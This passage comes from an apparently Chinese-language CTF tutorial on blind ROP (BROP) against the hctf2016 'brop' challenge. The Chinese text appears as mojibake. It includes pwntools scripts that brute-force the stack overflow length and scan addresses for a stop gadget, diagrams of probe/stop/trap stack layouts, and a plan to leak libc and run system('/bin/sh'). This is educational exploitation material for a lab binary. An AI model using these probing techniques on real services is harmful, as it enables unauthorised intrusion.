gadget</em></strong>ï¼Œè¿™ç§gadgetå¯¹äºå¯»æ‰¾å…¶ä»–gadgetså–åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚<br><strong>çŸ¥è¯†ç‚¹2-å¯åˆ©ç”¨çš„(potentially useful)gadgets</strong>ï¼šå‡è®¾ç°åœ¨æˆ‘ä»¬çŒœåˆ°æŸä¸ªuseful gadgetï¼Œæ¯”å¦‚pop rdi; ret, <em>ä½†æ˜¯ç”±äºåœ¨æ‰§è¡Œå®Œè¿™ä¸ªgadgetä¹‹åè¿›ç¨‹è¿˜ä¼šè·³åˆ°æ ˆä¸Šçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼Œå¦‚æœè¯¥åœ°å€æ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œé‚£ä¹ˆè¿›ç¨‹æœ€åè¿˜æ˜¯ä¼šcrash</em>ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ”»å‡»è€…å…¶å®å¹¶ä¸çŸ¥é“è¿™ä¸ªuseful gadgetè¢«æ‰§è¡Œè¿‡äº†ï¼ˆå› ä¸ºåœ¨æ”»å‡»è€…çœ‹æ¥æœ€åçš„æ•ˆæœéƒ½æ˜¯è¿›ç¨‹crashäº†ï¼‰ï¼Œå› æ­¤æ”»å‡»è€…å°±ä¼šè®¤ä¸ºåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æ‰§è¡Œåˆ°ä»»ä½•çš„useful gadgetï¼Œä»è€Œæ”¾å¼ƒå®ƒã€‚è¿™ä¸ªæ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185740.png" alt="Pasted image 20250206185740">ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æœ‰äº†stop gadgetï¼Œé‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹å°†ä¼šå¾ˆä¸ä¸€æ ·. å¦‚æœæˆ‘ä»¬åœ¨éœ€è¦å°è¯•çš„return addressä¹‹åå¡«ä¸Šäº†è¶³å¤Ÿå¤šçš„stop gadgetsï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185807.png" alt="Pasted image 20250206185807">é‚£ä¹ˆä»»ä½•ä¼šé€ æˆè¿›ç¨‹crashçš„gadgetæœ€åè¿˜æ˜¯ä¼šé€ æˆè¿›ç¨‹crashï¼Œè€Œé‚£äº›useful gadgetåˆ™ä¼šè¿›å…¥blockçŠ¶æ€ã€‚å°½ç®¡å¦‚æ­¤ï¼Œè¿˜æ˜¯æœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œå³é‚£ä¸ªæˆ‘ä»¬éœ€è¦å°è¯•çš„gadgetä¹Ÿæ˜¯ä¸€ä¸ªstop gadgetï¼Œé‚£ä¹ˆå¦‚ä¸Šæ‰€è¿°ï¼Œå®ƒä¹Ÿä¼šè¢«æˆ‘ä»¬æ ‡è¯†ä¸ºuseful gadgetã€‚ä¸è¿‡è¿™å¹¶æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºä¹‹åæˆ‘ä»¬è¿˜æ˜¯éœ€è¦æ£€æŸ¥è¯¥useful gadgetæ˜¯å¦æ˜¯æˆ‘ä»¬æƒ³è¦çš„gadgetã€‚</p></blockquote><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a href="https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master">ctfrepo/BROP/hctf2016-brop-master at master Â· zszcr/ctfrepo</a></p><h4 id="è§£ç­”æ€è·¯"><a href="#è§£ç­”æ€è·¯" class="headerlink" title="è§£ç­”æ€è·¯"></a>è§£ç­”æ€è·¯</h4><p>åšé¢˜æ€è·¯ï¼šæ§åˆ¶putså‡½æ•°æ‰“å°å‡ºè‡ªèº«çš„gotè¡¨åœ°å€ï¼Œé€šè¿‡gotåœ°å€åˆ©ç”¨LibcSearcherè®¡ç®—å‡ºå½“å‰ä½¿ç”¨çš„libcç‰ˆæœ¬ï¼Œæ¥ç€æ‰¾åˆ°systemå‡½æ•°å’Œ/bin/shåœ°å€éƒ¨ç½²åˆ°æ ˆä¸­æ‰§è¡Œ</p><h4 id="è§£ç­”æ­¥éª¤"><a href="#è§£ç­”æ­¥éª¤" class="headerlink" title="è§£ç­”æ­¥éª¤"></a>è§£ç­”æ­¥éª¤</h4><h5 id="1-åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦"><a href="#1-åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦" class="headerlink" title="1.åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦"></a>1.åˆ¤æ–­æ ˆæº¢å‡ºé•¿åº¦</h5><p>é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œéœ€è¦å¯¹æ ˆç©ºé—´è¿›è¡Œåˆ¤æ–­ï¼Œç¡®å®šæ ˆæº¢å‡ºçš„é•¿åº¦ã€‚<br>åˆ¤æ–­æ ˆæº¢å‡ºå¯ä»¥é€šè¿‡å¾ªç¯ä¸æ–­çš„å¢åŠ è¾“å…¥å­—ç¬¦çš„é•¿åº¦ï¼Œç›´è‡³ç¨‹åºå´©æºƒ<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å‡ºç°â€™WelCome my friend,Do you know password?â€™è¿™ä¸ªå­—æ ·ä¹‹åç­‰å¾…è¾“å…¥ï¼Œå½“è¾“å…¥ä¸€ä¸ªaçš„æ—¶å€™ï¼Œæ¥ä¸‹æ¥ä¼šæç¤ºâ€™No password, no gameâ€™çš„å­—æ ·<br>åŒæ—¶åœ¨æˆ‘ä»¬è¾“å…¥ä¸€ä¸²ç‰¹åˆ«é•¿çš„å­—ç¬¦ä¸²çš„æ—¶å€™æ²¡æœ‰å‡ºç°â€™No password, no gameâ€™çš„å­—æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¾ªç¯æ¥ä¸æ–­å¢åŠ å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¹¶ä¸”æ ¹æ®å›æ˜¾ç»“æœä¸­æ˜¯å¦æœ‰â€™No password, no gameâ€™å­—æ ·æ¥åˆ¤æ–­åˆ°ä»€ä¹ˆé•¿åº¦è¦†ç›–äº†retè¿”å›åœ°å€ï¼Œå¹¶ä¸”<strong>è¯¥é•¿åº¦å‡ä¸€å°±æ˜¯æ ˆæº¢å‡ºçš„é•¿åº¦</strong></p><p><strong>å¾ªç¯å†…å®¹ï¼šç´¯åŠ è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¡«æ»¡æ ˆç©ºé—´</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šå›æ˜¾ç»“æœèµ·å§‹ä½ç½®å­—ç¬¦ä¸²ä¸ºNo password, no game</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šç¡®å®šæ ˆæº¢å‡ºé•¿åº¦ï¼Œä¸ºåç»­æ‰€æœ‰æ­¥éª¤åšå‡†å¤‡</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#æš´åŠ›æšä¸¾å‡ºæ ˆæº¢å‡ºé•¿åº¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsize</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            p.send(i*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">            <span class="comment">#åˆ¤æ–­outputå˜é‡ä¸­èµ·å§‹ä½ç½®æ˜¯ä¸æ˜¯No passwordï¼Œå¦‚æœä¸æ˜¯è¯´æ˜å·²ç»æº¢å‡ºäº†</span></span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#ä¸»è¦æ¢æµ‹æ˜¯å¦å…·æœ‰canary</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">size = getsize()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;size is : %s &quot;</span>% size)</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„ä»£ç å¯ä»¥ç¡®å®šæ ˆæº¢å‡ºçš„é•¿åº¦ä¸º72ï¼Œå¹¶ä¸”æ ¹æ®è¿”å›ä¿¡æ¯å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤<br>æ ˆä¸­æƒ…å†µï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |           ret             | </span><br><span class="line">             +---------------------------+</span><br><span class="line">             |            a              | é€’å¢aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |            a+             | é€’å¢aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">ebp-ï¼Ÿ--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h5 id="2-å¯»æ‰¾stop-gadget"><a href="#2-å¯»æ‰¾stop-gadget" class="headerlink" title="2.å¯»æ‰¾stop gadget"></a>2.å¯»æ‰¾stop gadget</h5><p>å½“æˆ‘ä»¬æƒ³åŠæ³•å¯»æ‰¾gadgetçš„æ—¶å€™ï¼Œå¹¶ä¸çŸ¥é“ç¨‹åºå…·ä½“æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œæ‰€ä»¥éœ€è¦æ§åˆ¶è¿”å›åœ°å€è¿›è€Œå»çŒœæµ‹gadgetã€‚é‚£å½“æˆ‘ä»¬æ§åˆ¶è¿”å›åœ°å€æ—¶ï¼Œä¸€èˆ¬ä¼šå‡ºç°ä¸‰ç§æƒ…å†µ</p><ol><li>ç¨‹åºç›´æ¥å´©æºƒï¼šretåœ°å€æŒ‡å‘çš„æ˜¯ä¸€ä¸ªç¨‹åºå†…ä¸å­˜åœ¨çš„åœ°å€</li><li>ç¨‹åºè¿è¡Œä¸€æ®µæ—¶é—´åå´©æºƒï¼šæ¯”å¦‚è¿è¡Œè‡ªå·±æ„é€ çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è¿”å›åœ°å€æŒ‡å‘ä¸å­˜åœ¨çš„åœ°å€</li><li>ç¨‹åºä¸€ç›´è¿è¡Œè€Œä¸å´©æºƒ<br>stop gadgetä¸€èˆ¬æŒ‡çš„æ˜¯ï¼Œä½†ç¨‹åºæ‰§è¡Œè¿™æ®µä»£ç æ—¶ï¼Œç¨‹åºè¿›å…¥æ— é™å¾ªç¯ï¼Œè¿™æ ·ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿä¸€ç›´ä¿æŒè¿æ¥çŠ¶æ€ï¼Œå¹¶ä¸”ç¨‹åºä¸€ç›´è¿è¡Œè€Œä¸å´©æºƒã€‚å°±åƒè›‡åƒè‡ªå·±çš„å°¾å·´ä¸€æ ·ï¼Œstop gadgetæœ€åçš„retç»“å°¾åœ°å€å°±æ˜¯ç¨‹åºå¼€å¯çš„åœ°å€ï¼ˆæ¯”å¦‚mainå‡½æ•°åœ°å€ï¼‰</li></ol><p>ç”±äºçœ‹ä¸åˆ°äºŒè¿›åˆ¶ç¨‹åºæ‰€ä»¥ä¾ç„¶è¿˜éœ€è¦ä½¿ç”¨ç©·ä¸¾çš„æ–¹å¼ä¸æ–­çš„å°è¯•æ¯ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»åˆå§‹çš„åœ°å€0x400000å¼€å§‹ï¼Œé€šè¿‡å¾ªç¯ï¼Œä¸æ–­ç´¯åŠ åœ°å€è¿›è¡Œå°è¯•ï¼ˆå‰é¢æ£€æµ‹ç¨‹åºä¿æŠ¤è®²äº†ä¸ºä»€ä¹ˆåˆå§‹åœ°å€æ˜¯0x400000ï¼‰ã€‚æœ‰äº†å¾ªç¯ä¹‹åå°±éœ€è¦è€ƒè™‘å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼Œç»ˆæ­¢æ¡ä»¶å¯ä»¥å‚è€ƒstop gadgetçš„ç‰¹æ€§ï¼Œåœ¨æ‰§è¡Œstop gadgetçš„æ—¶å€™ç¨‹åºä¼šå›åˆ°åˆå§‹çŠ¶æ€å¹¶ä¸”æ²¡æœ‰å‘ç”Ÿå´©æºƒã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œä½¿ç”¨å‰é¢æ‰¾åˆ°çš„72å­—èŠ‚å¡«æ»¡æ ˆç©ºé—´ï¼Œä¹‹åæ¥ä¸Šç©·ä¸¾çš„åœ°å€ï¼Œæ­¤æ—¶ç©·ä¸¾åœ°å€è¦†ç›–äº†retåœ°å€ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šæ‰§è¡Œç©·ä¸¾åœ°å€ï¼Œå¦‚æœæ­¤æ—¶ç¨‹åºå‘ç”Ÿå´©æºƒå°±è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯ï¼Œå¦‚æœæ²¡æœ‰å´©æºƒåˆ™æ‰“å°è¯¥åœ°å€</p><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œå°è¯•å¯èƒ½çš„stop gadget</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šç¨‹åºä¸å‘ç”Ÿå´©æºƒ</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šç¡®å®šstop gadgetä¸ºåé¢æŸ¥æ‰¾brop gadgetã€puts pltã€puts gotåšå‡†å¤‡</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop</span>():</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,trying the address is &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,the payload is &quot;</span>,payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;main funciton--&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;one success addr : 0x%x&#x27;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a bad addr&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t connect,retrying&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">data = get_stop()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Success,call Main Function address is&quot;</span>,<span class="built_in">hex</span>(data))</span><br></pre></td></tr></table></figure><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206201043.png" alt="Pasted image 20250206201043"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨IDA(ä»…ä½œéªŒè¯ï¼Œbropç†åº”æ— æ–‡ä»¶)ï¼Œå¯çŸ¥è¯¥åœ°å€ä¸ºmainå‡½æ•°</p><h5 id="3-å¯»æ‰¾brop-gadget"><a href="#3-å¯»æ‰¾brop-gadget" class="headerlink" title="3.å¯»æ‰¾brop gadget"></a>3.å¯»æ‰¾brop gadget</h5><p>åœ¨å‰é¢æ‰¾åˆ°äº†stop gadgetæˆ‘ä»¬æ€ä¹ˆå»åˆ©ç”¨ä»–å‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ‰¾åˆ°èƒ½å¤Ÿæ§åˆ¶å¯„å­˜å™¨çš„gadgetã€‚ç”±äºæˆ‘ä»¬çš„è®¡åˆ’æ˜¯åˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºè‡ªå·±çš„gotåœ°å€ï¼Œé€šè¿‡gotåœ°å€æ‰¾åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œç„¶åæ‰¾åˆ°systemå‡½æ•°å’Œ/bin/shåœ°å€éƒ¨ç½²åˆ°æ ˆä¸­æ‰§è¡Œã€‚é‚£ä¹ˆéœ€è¦è€ƒè™‘çš„ä¸€ç‚¹æ˜¯åœ¨è°ƒç”¨putså‡½æ•°ä¹‹å‰éœ€è¦å°†æ‰“å°çš„å†…å®¹å‹è¿›rdiå¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå°±éœ€è¦é€šè¿‡gadgetæ¥æ§åˆ¶rdiå¯„å­˜å™¨ã€‚<br>å…¶å®åœ¨libc_csu_initçš„ç»“å°¾ä¸€é•¿ä¸²popçš„gadgetä¸­ï¼Œé€šè¿‡åç§»å¯ä»¥å¾—åˆ°pop rdiçš„æ“ä½œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+  </span><br><span class="line">|         pop rbx           |  <span class="number">0x00</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop rbp           |  <span class="number">0x01</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r12           |  <span class="number">0x02</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r13           |  <span class="number">0x04</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r14           |  <span class="number">0x06</span></span><br><span class="line">+---------------------------+----------&gt;pop rsi;ret <span class="number">0x07</span></span><br><span class="line">|         pop r15           |  <span class="number">0x08</span></span><br><span class="line">+---------------------------+----------&gt;pop rdi;ret <span class="number">0x09</span></span><br><span class="line">|           ret             |  <span class="number">0x10</span></span><br><span class="line">-----------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœä»¥pop rbxä¸ºåŸºåœ°å€çš„è¯å‘ä¸‹åç§»0x07ä¼šå¾—åˆ°pop rsiçš„æ“ä½œï¼Œå‘ä¸‹åç§»0x09ä¼šå¾—åˆ°pop rdiçš„æ“ä½œã€‚è¿™ä¸¤ä¸ªæ“ä½œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ§åˆ¶putså‡½æ•°çš„è¾“å‡ºå†…å®¹</p><p>é‚£ä¹ˆå¾€å›æƒ³æ—¢ç„¶æˆ‘ä»¬éœ€è¦ç”¨åˆ°pop rdiã€rsiçš„æ“ä½œå°±éœ€è¦çŸ¥é“libc_csu_initç»“å°¾6ä¸ªpopæ“ä½œçš„ä½ç½®ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„stop gadgetå°±æ´¾ä¸Šç”¨åœºäº†ï¼Œä¸ºäº†æ›´å¥½åœ°æ¼”ç¤ºstop gadgetçš„ä½¿ç”¨ï¼Œè¿™é‡Œå®šä¹‰æ ˆä¸Šçš„ä¸‰ç§åœ°å€</p><ul><li>Probe - - æ¢é’ˆï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦å¾ªç¯é€’å¢çš„ä»£ç åœ°å€ã€‚ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯64ä½ç¨‹åºï¼Œå¯ä»¥ç›´æ¥ä»0x400000å°è¯•</li><li>Stop - - ä¸ä¼šä½¿å¾—ç¨‹åºå´©æºƒçš„stop gadgetçš„åœ°å€</li><li>Trap - - å¯ä»¥å¯¼è‡´ç¨‹åºå´©æºƒçš„åœ°å€</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æ ˆä¸Šæ‹œè®¿ä¸åŒç¨‹åºçš„Stopä¸Trapä»è€Œæ¥è¯†åˆ«å‡ºæ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œä¸¾å‡ ä¸ªä¾‹å­</p><ul><li>probe, stop, traps, (traps, traps, â€¦)ä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            |&lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          stop             |&lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            |&lt;----- æ¢é’ˆ</span><br><span class="line">-----------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚<strong>è¯´æ˜äº†probeæ¢é’ˆä¸­æ²¡æœ‰popæ“ä½œï¼Œå¹¶ä¸”æœ‰retè¿”å›</strong>ï¼Œå¦‚æœæœ‰popæ“ä½œçš„è¯stopä¼šè¢«popè¿›å¯„å­˜å™¨å½“ä¸­ï¼Œé‚£ä¹ˆprobeæ¢é’ˆçš„retè¿”å›å°±ä¼šæŒ‡å‘stopçš„åå‡ ä½trapsï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚é‚£ä¹ˆç”±äºåœ¨æ ˆå¸ƒå±€ä¸­stop gadgetåœ¨probeæ¢é’ˆçš„ä¸‹ä¸€ä½ï¼Œè¯´æ˜stopæ‰€åœ¨ä½ç½®å°±æ˜¯probeæ¢é’ˆçš„retè¿”å›åœ°å€ä½ç½®ã€‚å¦‚ï¼š<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ret</span><br><span class="line">xor eax,eax; ret</span><br></pre></td></tr></table></figure></li><li>probe, traps, stop, rapsä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           stop            | &lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½</span><br><span class="line">+---------------------------+</span><br><span class="line">|          trap             | &lt;----- trapï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            | &lt;----- æ¢é’ˆ</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚è¯´æ˜probeæŒ‡é’ˆä¸­ä»…å­˜åœ¨ä¸€ä¸ªpopæ“ä½œï¼Œå¹¶ä¸”æœ‰retè¿”å›ï¼Œåœ¨probeæ¢é’ˆä¸­åªæœ‰ä¸€ä¸ªpopæ“ä½œçš„æ—¶å€™æ‰ä¼šåªå°†probeåé¢çš„trapå¼¹è¿›å¯„å­˜å™¨ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªåŠä¸¤ä¸ªä»¥ä¸Šçš„popæ“ä½œçš„æ—¶å€™ï¼Œstop gadgetä¹Ÿä¼šè¢«å¼¹è¿›å¯„å­˜å™¨ä¸­æ— æ³•æ‰§è¡Œã€‚å¹¶ä¸”åœ¨probeæ¢é’ˆä¸­retè¿”å›æ‰€æŒ‡çš„ä½ç½®æ˜¯stopæ‰èƒ½ä½¿ç¨‹åºä¸å´©æºƒï¼Œå¦‚ï¼š<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure></li><li>probe, trap, trap, trap, trap, trap, trap, stop, trapsä»¥è¿™æ ·çš„æ–¹å¼è¿›è¡Œæ’åˆ—ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹åœ¨æ ˆä¸­çš„æ’åˆ—<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|           traps           | &lt;----- 